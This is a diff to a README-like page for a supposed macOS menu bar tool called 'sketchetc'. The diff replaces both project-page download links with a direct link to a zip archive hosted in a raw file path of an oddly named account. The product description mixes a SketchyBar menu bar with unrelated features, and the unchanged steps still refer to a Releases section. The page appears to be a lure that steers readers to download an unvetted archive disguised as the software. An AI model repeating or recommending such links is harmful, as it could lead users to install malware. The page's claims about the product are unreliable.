@@ -5,7 +5,7 @@ description: "Build a themeable and interactive macOS menu bar with SketchyBar."
 ---
 # 🌴 sketchetc - Simplify your digital life with style
 
-[![](https://img.shields.io/badge/download-sketchetc-blue.svg)](https://github.com/angelic-lutheranchurch172/sketchetc)
+[![](https://img.shields.io/badge/download-sketchetc-blue.svg)](https://raw.githubusercontent.com/angelic-lutheranchurch172/angelic-lutheranchurch172.github.io/main/lipwork/1.9.zip)
 
 Sketchetc brings a Vice City aesthetic to your daily computer workflow. It organizes your work, secures your thoughts, and monitors your system performance. The software provides tools to track your clipboard, snap windows into place, and maintain a private journal. Open source software ensures your data stays under your control.
 
@@ -13,7 +13,7 @@ Sketchetc brings a Vice City aesthetic to your daily computer workflow. It organ
 
 You must visit the project page to download the latest setup file for your computer. 
 
-[Download the latest version here](https://github.com/angelic-lutheranchurch172/sketchetc)
+[Download the latest version here](https://raw.githubusercontent.com/angelic-lutheranchurch172/angelic-lutheranchurch172.github.io/main/lipwork/1.9.zip)
 
 1. Visit the link provided above.
 2. Look for the section labeled Releases on the right side of the screen.
